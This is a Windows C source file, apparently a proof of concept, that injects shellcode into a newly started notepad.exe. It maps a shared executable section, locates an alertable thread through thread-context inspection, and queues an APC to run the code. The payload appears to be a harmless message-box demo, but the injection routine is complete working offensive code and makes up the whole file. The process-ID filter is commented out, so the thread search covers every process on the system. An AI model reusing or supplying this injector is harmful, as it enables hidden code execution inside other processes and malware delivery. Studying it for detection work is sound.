#include <Windows.h>
#include <tlhelp32.h>

//
// Definitions
//
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_OPEN_FAILED  0xC0000136
#define STATUS_SUCCESS      0x00000000

// ReSharper disable CppInconsistentNaming
typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;

typedef NTSTATUS(__stdcall* NTCREATESECTION)(HANDLE*, ULONG, POBJECT_ATTRIBUTES, LARGE_INTEGER*, ULONG, ULONG, HANDLE);
typedef NTSTATUS(__stdcall* NTMAPVIEWOFSECTION)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(__stdcall* RTLCREATEUSERTHREAD)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);
typedef NTSTATUS(__stdcall* NTCLOSE)(HANDLE);
// ReSharper restore CppInconsistentNaming

HANDLE FindAlertableThread(HANDLE, DWORD);

INT main() {
    NTSTATUS				ntStatus;
    STARTUPINFOA			startupInfo;
    PROCESS_INFORMATION		processInformation;
    BYTE					bMessageboxShellcode64[] = "\x48\x89\x5C\x24\x18\x48\x89\x7C\x24\x20\x55\x48\x8D\x6C\x24\xA9\x48\x81\xEC\xA0\x00\x00\x00\x33\xDB\xC7\x45\x17\x75\x00\x73\x00\xB9\x13\x9C\xBF\xBD\x48\x89\x5D\x67\x89\x5D\xFB\x89\x5D\x0B\x66\x89\x5D\x47\xC7\x45\x1B\x65\x00\x72\x00\xC7\x45\x1F\x33\x00\x32\x00\xC7\x45\x23\x2E\x00\x64\x00\xC7\x45\x27\x6C\x00\x6C\x00\xC7\x45\xD7\x4D\x65\x73\x73\xC7\x45\xDB\x61\x67\x65\x42\xC7\x45\xDF\x6F\x78\x57\x00\xC7\x45\x2F\x48\x00\x65\x00\xC7\x45\x33\x6C\x00\x6C\x00\xC7\x45\x37\x6F\x00\x20\x00\xC7\x45\x3B\x57\x00\x6F\x00\xC7\x45\x3F\x72\x00\x6C\x00\xC7\x45\x43\x64\x00\x21\x00\xC7\x45\xE7\x44\x00\x65\x00\xC7\x45\xEB\x6D\x00\x6F\x00\xC7\x45\xEF\x21\x00\x00\x00\xE8\x74\x00\x00\x00\xB9\xB5\x41\xD9\x5E\x48\x8B\xD8\xE8\x67\x00\x00\x00\x48\x8B\xF8\xC7\x45\xF7\x14\x00\x14\x00\x48\x8D\x45\x17\x33\xD2\x4C\x8D\x4D\x6F\x48\x89\x45\xFF\x4C\x8D\x45\xF7\x33\xC9\xFF\xD3\x48\x8B\x4D\x6F\x48\x8D\x45\xD7\x45\x33\xC0\x48\x89\x45\x0F\x4C\x8D\x4D\x67\xC7\x45\x07\x0C\x00\x0C\x00\x48\x8D\x55\x07\xFF\xD7\x45\x33\xC9\x4C\x8D\x45\xE7\x48\x8D\x55\x2F\x33\xC9\xFF\x55\x67\x4C\x8D\x9C\x24\xA0\x00\x00\x00\x49\x8B\x5B\x20\x49\x8B\x7B\x28\x49\x8B\xE3\x5D\xC3\xCC\xCC\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xE9\x45\x33\xF6\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB3\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x41\x8B\xD6\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x46\x8B\x9C\x00\x88\x00\x00\x00\x45\x85\xDB\x74\xD2\x48\x8B\x04\x24\x48\xC1\xE8\x10\x66\x44\x3B\xF0\x73\x22\x48\x8B\x4C\x24\x08\x44\x0F\xB7\xD0\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEA\x01\x75\xE7\x4F\x8D\x14\x18\x45\x8B\xDE\x41\x8B\x7A\x20\x49\x03\xF8\x45\x39\x72\x18\x76\x8E\x8B\x37\x41\x8B\xDE\x49\x03\xF0\x48\x8D\x7F\x04\x0F\xBE\x0E\x48\xFF\xC6\xC1\xCB\x0D\x03\xD9\x84\xC9\x75\xF1\x8D\x04\x13\x3B\xC5\x74\x0E\x41\xFF\xC3\x45\x3B\x5A\x18\x72\xD5\xE9\x5E\xFF\xFF\xFF\x41\x8B\x42\x24\x43\x8D\x0C\x1B\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x6C\x24\x28\x48\x8B\x74\x24\x30\x48\x8B\x7C\x24\x38\x48\x83\xC4\x10\x41\x5E\xC3";
    SIZE_T					dwReqBufSize = sizeof bMessageboxShellcode64;
    LARGE_INTEGER			sectionSize = { dwReqBufSize };
    DWORD                   dwPid;
    LONG					lRetVal = STATUS_SUCCESS;
    HANDLE                  hProcess;
    HANDLE                  hTread;
    HANDLE					hSection = NULL;
    PVOID					pLocalSectionAddress = NULL;
    PVOID					pRemoteSectionAddress = NULL;
    PTHREAD_START_ROUTINE   apcRoutine;

    // Function pointers
    NTCREATESECTION			pNtCreateSection;
    NTMAPVIEWOFSECTION		pNtMapViewOfSection;
    RTLCREATEUSERTHREAD		pRtlCreateUserThread;
    NTCLOSE					pNtClose;

    //
    // Load required functions from ntdll
    //
    CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
    if (hNtdll) {
        pNtCreateSection = (NTCREATESECTION)GetProcAddress(hNtdll, "NtCreateSection");
        pNtMapViewOfSection = (NTMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtMapViewOfSection");
        pRtlCreateUserThread = (RTLCREATEUSERTHREAD)GetProcAddress(hNtdll, "RtlCreateUserThread");
        pNtClose = (NTCLOSE)GetProcAddress(hNtdll, "NtClose");
        FreeLibrary(hNtdll);
    }
    else {
        return ERROR_MOD_NOT_FOUND;
    }

    //
    // Create host process
    //
    ZeroMemory(&startupInfo, sizeof startupInfo);
    startupInfo.cb = sizeof startupInfo;
    ZeroMemory(&processInformation, sizeof processInformation);

    if (!CreateProcessA(NULL, "\"notepad.exe\"", NULL, NULL, FALSE,
        DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
        return STATUS_OPEN_FAILED;
    }

    dwPid = processInformation.dwProcessId;
    if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
        lRetVal = STATUS_OPEN_FAILED;
        goto lblCleanup;
    }

    //
    // Find allertable thread
    //
    hTread = FindAlertableThread(hProcess, dwPid);
	if (!hTread) {
        return STATUS_INVALID_HANDLE;
	}

    //
    // Create a section
    //
    ntStatus = pNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, 
        (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(ntStatus)) {
        return ntStatus;
    }

    //
    // Map section to local process
    //
    ntStatus = pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalSectionAddress, 0, 0, NULL, &dwReqBufSize, 2, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(ntStatus)) {
        return ntStatus;
    }

    //
    // Map section to target process
    //
    ntStatus = pNtMapViewOfSection(hSection, hProcess, &pRemoteSectionAddress, 0, 0, NULL, &dwReqBufSize, 2, 0, PAGE_EXECUTE_READ);
    if (!NT_SUCCESS(ntStatus)) {
        lRetVal = ntStatus;
        goto lblCleanup;
    }

    //
    // copy shellcode to the local view, which will get reflected in the target process's mapped view
    //
    memcpy(pLocalSectionAddress, bMessageboxShellcode64, sizeof bMessageboxShellcode64);

    apcRoutine = (PTHREAD_START_ROUTINE)pRemoteSectionAddress;
    QueueUserAPC((PAPCFUNC)apcRoutine, hTread, 0);
    Sleep(1000 * 2);

lblCleanup:
    if (hSection) {
        pNtClose(hSection);
    }

    if (processInformation.hProcess) {
        CloseHandle(processInformation.hProcess);
    }

    if (processInformation.hThread) {
        CloseHandle(processInformation.hThread);
    }

    return lRetVal;
}

BOOL IsAlertable(HANDLE hProcess, HANDLE hThread, LPVOID lpAddr[6]) {
    CONTEXT   context;
    BOOL      bAlertable = FALSE;
    DWORD     i;
    ULONG_PTR p[8];
    SIZE_T    cbBytesRead;

    // read the context
    context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    GetThreadContext(hThread, &context);

    // for each alertable function
    for (i = 0; i < 6 && !bAlertable; i++) {
        // compare address with program counter
        if ((LPVOID)context.Rip == lpAddr[i]) {
            switch (i) {
            // ZwDelayExecution
            case 0: {
                bAlertable = (context.Rcx & TRUE);
                break;
            }
            // NtWaitForSingleObject
            case 1: {
                bAlertable = (context.Rdx & TRUE);
                break;
            }
            // NtWaitForMultipleObjects
            case 2: {                                                                                                       // NOLINT(bugprone-branch-clone)
                bAlertable = (context.Rsi & TRUE);
                break;
            }
            // NtSignalAndWaitForSingleObject
            case 3: {
                bAlertable = (context.Rsi & TRUE);
                break;
            }
            // NtUserMsgWaitForMultipleObjectsEx
            case 4: {
                ReadProcessMemory(hProcess, (LPVOID)context.Rsp, p, sizeof(p), &cbBytesRead);
                bAlertable = (p[5] & MWMO_ALERTABLE);
                break;
            }
            // NtRemoveIoCompletionEx
            case 5: {
                ReadProcessMemory(hProcess, (LPVOID)context.Rsp, p, sizeof(p), &cbBytesRead);
                bAlertable = (p[6] & TRUE);
                break;
            }
            }
        }
    }
    return bAlertable;
}

// thread to run alertable functions
DWORD WINAPI ThreadProc(LPVOID lpParameter) {
    HANDLE*          evt = (HANDLE)lpParameter;
    HANDLE           hPort;
    OVERLAPPED_ENTRY lap;
    DWORD            dwNumEntriesRemoved;

    SleepEx(INFINITE, TRUE);

    WaitForSingleObjectEx(evt[0], INFINITE, TRUE);

    WaitForMultipleObjectsEx(2, evt, FALSE, INFINITE, TRUE);

    SignalObjectAndWait(evt[1], evt[0], INFINITE, TRUE);

    ResetEvent(evt[0]);
    ResetEvent(evt[1]);

    MsgWaitForMultipleObjectsEx(2, evt,
        INFINITE, QS_RAWINPUT, MWMO_ALERTABLE);

    hPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
    if (hPort) {
        GetQueuedCompletionStatusEx(hPort, &lap, 1, &dwNumEntriesRemoved, INFINITE, TRUE);
        CloseHandle(hPort);
    }

    return 0;
}

HANDLE FindAlertableThread(HANDLE hProcess, DWORD dwPid) {
    HANDLE        hSnapshot, hTread, hEvent[2], hReturn = NULL;
    LPVOID        pSetEvent, f[6];
    THREADENTRY32 threadEntry;
    DWORD         i;
    CONTEXT       context;
    HMODULE       hModule;

    // using the offset requires less code but it may
    // not work across all systems.
#ifdef USE_OFFSET
    PCHAR api[6] = {
      "ZwDelayExecution",
      "ZwWaitForSingleObject",
      "NtWaitForMultipleObjects",
      "NtSignalAndWaitForSingleObject",
      "NtUserMsgWaitForMultipleObjectsEx",
      "NtRemoveIoCompletionEx" };

    // 1. Resolve address of alertable functions
    for (i = 0; i < 6; i++) {
        hModule = GetModuleHandle(i == 4 ? L"win32u" : L"ntdll");
        f[i] = (LPBYTE)GetProcAddress(hModule, api[i]) + 0x14;
    }
#else
    // create thread to execute alertable functions
    hEvent[0] = CreateEvent(NULL, FALSE, FALSE, NULL);
    hEvent[1] = CreateEvent(NULL, FALSE, FALSE, NULL);
    hTread = CreateThread(NULL, 0, ThreadProc, hEvent, 0, NULL);
    if (!hTread) {
        return INVALID_HANDLE_VALUE;
    }

    // wait a moment for thread to initialize
    Sleep(100);

    // resolve address of SetEvent
    hModule = GetModuleHandle(L"kernel32.dll");
    if (hModule) {
        pSetEvent = GetProcAddress(hModule, "SetEvent");
        FreeLibrary(hModule);
    }
    else {
        return INVALID_HANDLE_VALUE;
    }

    // for each alertable function
    for (i = 0; i < 6; i++) {
        // read the thread context
        context.ContextFlags = CONTEXT_CONTROL;
        GetThreadContext(hTread, &context);
        // save address
        f[i] = (LPVOID)context.Rip;
        // queue SetEvent for next function
        QueueUserAPC(pSetEvent, hTread, (ULONG_PTR)hEvent);
    }
    
    // cleanup thread
    if (hTread) {
        CloseHandle(hTread);
    }
    if (hEvent[0]) {
        CloseHandle(hEvent[0]);
    }
    if (hEvent[1]) {
        CloseHandle(hEvent[1]);
    }
#endif

    // Create a snapshot of threads
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;

    // check each thread
    threadEntry.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hSnapshot, &threadEntry)) {
        do {
            // if not our target process, skip it
            //if (threadEntry.th32OwnerProcessID != dwPid) continue;

            // if we can't open thread, skip it
            hTread = OpenThread(
                THREAD_ALL_ACCESS,
                FALSE,
                threadEntry.th32ThreadID);

            if (hTread == NULL) continue;

            // found alertable thread?
            if (IsAlertable(hProcess, hTread, f)) {
                // save handle and exit loop
                hReturn = hTread;
                break;
            }
            // else close it and continue
            CloseHandle(hTread);
        } while (Thread32Next(hSnapshot, &threadEntry));
    }
    // close snap shot
    CloseHandle(hSnapshot);
    return hReturn;
}
